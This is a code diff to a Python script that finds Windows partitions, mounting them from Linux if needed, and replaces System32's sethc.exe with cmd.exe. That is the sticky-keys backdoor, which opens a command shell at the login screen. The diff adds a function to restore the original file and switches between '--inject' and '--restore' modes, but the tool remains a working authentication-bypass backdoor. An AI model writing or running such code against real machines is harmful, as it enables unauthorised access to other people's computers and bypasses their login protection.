@@ -7,7 +7,6 @@ import sys
 def check_for_ntoskrnl(partition):
     ntoskrnl_path = os.path.join(partition, 'Windows', 'System32', 'ntoskrnl.exe')
     return os.path.exists(ntoskrnl_path)
-
 def inject_sethc(partition):
     sethc_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe')
     new_sethc_path = os.path.join(partition, 'Windows', 'System32', 'cmd.exe')
@@ -27,6 +26,24 @@ def inject_sethc(partition):
     except Exception as e:
         print(f"Error while copying new sethc.exe: {e}")
         return False
+def restore_sethc(partition):
+    backup_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe.old')
+    sethc_path = os.path.join(partition, 'Windows', 'System32', 'sethc.exe')
+    if not os.path.exists(backup_path):
+        print("sethc.exe.old not found. Aborting.")
+        return False
+    try:
+        os.remove(sethc_path)
+        print("Deleted backdoored sethc.exe")
+    except Exception as e:
+        print(f"Error while removing sethc.exe: {e}")
+        return False
+    try:
+        os.rename(backup_path, sethc_path)
+        print("Original sethc.exe restored")
+    except Exception as e:
+        print(f"Error while renaming sethc.exe.old: {e}")
+        return False
 def find_windows_partitions():
     partitions = psutil.disk_partitions()
     found_windows = False
@@ -35,7 +52,10 @@ def find_windows_partitions():
         if partition.fstype.lower() == 'ntfs':
             if check_for_ntoskrnl(partition.mountpoint):
                 print(f"Found Windows partition: {partition.device}")
-                inject_sethc(partition.device)
+                if sys.argv[1] == '--inject':
+                    inject_sethc(partition.device)
+                elif sys.argv[1] == '--restore':
+                    restore_sethc(partition.device)
                 found_windows = True
                 break
     if not found_windows:
@@ -53,7 +73,10 @@ def find_windows_partitions():
                             print(f"Found Windows partition: /dev/{part[0]}")
                             found_windows = True
                             print(f'mounted at : {temp_dir}')
-                            inject_sethc(temp_dir)
+                            if sys.argv[1] == '--inject':
+                                inject_sethc(temp_dir)
+                            elif sys.argv[1] == '--restore':
+                                restore_sethc(temp_dir)
                             break
                         subprocess.run(['umount', temp_dir])
                     except Exception as e:
@@ -61,10 +84,5 @@ def find_windows_partitions():
                         
     if not found_windows:
         print("No Windows partitions found.")
-if sys.argv[1] == '--windows':
-    find_windows_partitions()
-elif sys.argv[1] == '--linux':
-    print('not supported yet')
-else:
-    pass
+find_windows_partitions()
 input("press enter to return")
